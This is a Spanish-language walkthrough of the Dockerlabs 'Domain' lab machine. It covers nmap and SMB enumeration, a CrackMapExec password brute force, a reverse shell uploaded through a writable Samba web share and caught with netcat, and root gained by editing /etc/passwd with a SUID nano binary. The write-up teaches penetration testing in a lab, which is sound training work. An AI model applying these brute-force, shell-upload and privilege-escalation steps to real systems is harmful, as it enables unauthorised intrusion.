# Domain

Pequeña Máquina en modo **medium** de Dockerlabs.

- [Reconocimiento](#reconocimiento)
- [Escaneo](#escaneo)
- [Enumeración](#enumeración)
- [Explotación](#explotación)
- [Escalada de privilegios](#escalada-de-privilegios)

---

## Reconocimiento

La máquina objetivo se encuentra correctamente desplegada dentro de la red de laboratorio (en este caso, utilizando Docker).  
Para identificarla se realizó el uso de `arp-scan` para identificar los dispositivos en nuestra red docker con la interfaz `docker0`

```bash
sudo arp-scan -I docker0 --localnet
Interface: docker0, type: EN10MB, MAC: 02:42:77:20:48:b6, IPv4: 172.17.0.1
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 65536 hosts (https://github.com/royhills/arp-scan)
172.17.0.2	02:42:ac:11:00:02	(Unknown: locally administered)
```

---

## Escaneo

Se realizó un escaneo con **Nmap** para identificar puertos abiertos y servicios:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
```

```
# Nmap 7.95 scan initiated Wed Oct 15 16:09:14 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sC -sV --min-rate 5000 -n -Pn -o nmap.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-10-15T20:09:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 15 16:09:32 2025 -- 1 IP address (1 host up) scanned in 17.76 seconds

```

---

## Enumeración

Al detectarse varios puertos, desde un **80** con aplicativo web y un par de **139** y **445** indicando un posible servicio de `SAMBA` corriendo se empezó primero con el sitio web.

![SAMBAWeb](https://i.imgur.com/q3s8D4z.png)

Se enumeró con **Gobuster** en búsqueda de directorios pero los resultados fueron pobres, por lo que se procedió a los servicios de SAMBA en los puertos anteriormente mencionados.

```bash
> gobuster dir -u "172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,php.bak -t 20 -o gobuster.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1832]
/server-status        (Status: 403) [Size: 275]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Al ejecutar el `smbclient` se pudo obtener la lista de recursos compartidos del hosts target.

```bash
> smbclient -L \\\\172.17.0.2 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	html            Disk      HTML Share
	IPC$            IPC       IPC Service (aee0f4d201ac server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

Teniendo en cuenta que en el scan de **nmap** se había encontrado un mensaje con una posible vulnerabilidad de que el servicio tenía el signing activado pero no era requerido: ` Message signing enabled but not required`, se intentó acceder sin usuario y sin contraseña pero los esfuerzos no dieron resultados positivos.

![Denied](https://i.imgur.com/UXUrDjg.png)

En base a esto se realizó otro scaneo con **nxc** y **Nmap** implementando scripts para enumerar directamente el puerto **445** y ver qué resultados se obtenían.

Nxc:

```bash
> nxc smb 172.17.0.2/24 --gen-relay-list relay_list.txt
SMB         172.17.0.2      445    AEE0F4D201AC     [*] Unix - Samba (name:AEE0F4D201AC) (domain:AEE0F4D201AC) (signing:False) (SMBv1:False)
Running nxc against 256 targets ----------------- 100% 0:00:00

```

Nmap:

```bash
> nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 17:05 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000046s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

Obteniendo esto se procede a utilizar el **rpcclient** para realizar una enumeración un poco más enfocada a ejecutar funciones de **Microsoft RPC**, de esta manera se obtuvo un par de usuarios.

```bash
> rpcclient -U '' -N 172.17.0.2
rpcclient $> querydispinfo and enumdoumusers
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james	Name: james	Desc:
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob	Name: bob	Desc:
rpcclient $>
```

Lo siguiente fue realizar ataques de fuerza bruta para encontrar contraseñas de algunos de estos usuarios, primeramente se pensó en **Hydra** pero no soporta SMBv1 por lo que se consideró más apropiado el uso de **CrackMapExec** teniendo en cuenta un posible entorno de windows.

```bash
> crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt | grep -v -E 'LOGON_FAILURE'

SMB                      172.17.0.2      445    AEE0F4D201AC     [*] Windows 6.1 Build 0 (name:AEE0F4D201AC) (domain:AEE0F4D201AC) (signing:False) (SMBv1:False)
SMB                      172.17.0.2      445    AEE0F4D201AC     [+] AEE0F4D201AC\bob:star
```

## Explotación

El resultado del anterior bruteforce arrojó una contraseña para el usuario `bob` que luego pudo ser utilizada para conectarse desde el **Smbclient** a la red de recursos compartidos.

```bash
> smbclient \\\\172.17.0.2\\html -U "bob"%"star"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 11 04:35:48 2024
  ..                                  D        0  Thu Apr 11 04:18:47 2024
  index.html                          N     1832  Thu Apr 11 04:21:43 2024

		38818336 blocks of size 1024. 1555844 blocks available
```

Con el comando `get index.html` se obtuvo el fichero y se determinó que era el mismo alojado en la página principal con el puerto **80** por lo que se procedió a realizar un **Unrestricted File Upload** y cargar una reverse shell con el comando `put` ya codificada para conectarse desde la terminal usando **netcat**.

![Uploading Shell](https://i.imgur.com/DSMKiMF.png)

Desde el navegador se accedió al a url de shell y el resultado fue positivo para realizar una conexión en reversa.

![Reverse Shell](https://i.imgur.com/UUglTkO.png)

## Escalada de privilegios

Luego de recibir la reverse shell en la máquina Kali, el comando `whoami` reveló el usuario `www-data` por lo que se revisó el archivo `/etc/passwd` para analizar qué usuarios eran capaces de ejecutar `/bin/bash` y así poder obtener una escalada de privilegios.
Por otro lado también se hizo tratamiento de la tty para trabajar de manera interactiva con la shell.
En el listado se encontró al usuario `bob` del cual ya se había accedido a su contraseña, por lo que se realizó un `su bob` para cambiar al mismo

```bash
> nc -nlvp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 52316
Linux aee0f4d201ac 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64 x86_64 x86_64 GNU/Linux
 18:54:24 up 10:27,  0 users,  load average: 0.91, 0.62, 0.45
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@aee0f4d201ac:/$ export TERM=xterm
export TERM=xterm
www-data@aee0f4d201ac:/$ ^Z
[1]  + 505274 suspended  nc -nlvp 443
\u276f stty raw -echo; fg
[1]  + 505274 continued  nc -nlvp 443

www-data@aee0f4d201ac:/$ whoami
www-data
www-data@aee0f4d201ac:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
james:x:1001:1001:james,,,:/home/james:/bin/bash
www-data@aee0f4d201ac:/$ stty rows 62 columns 248
www-data@aee0f4d201ac:/$ su bob
Password:
bob@aee0f4d201ac:/$
```

Siendo `bob` y buscando **binarios** con SUID o que pudiesen ser aprovechados para obtener el `root` se encontró el bin `nano`, de manera que se intentó directamente modificar el `/etc/passwd` y remover la **x** del usuario root para así quitarle la autenticación por contraseña, con el tratamiento de la tty no hubo inconvenientes al momento de hacer la manipulación con `nano`

```bash
bob@aee0f4d201ac:/$ find / -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/nano
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
bob@aee0f4d201ac:/$ nano /etc/passwd
bob@aee0f4d201ac:/$ nano /etc/passwd
bob@aee0f4d201ac:/$ su root
root@aee0f4d201ac:/#
```

Luego de haber modificado el archivo se utilizó el `su root` y no hubo **input** alguno para ingresar la contraseña, automáticamente se accedió al user `root` y con esto ya se alcanzó el control sobre la máquina.
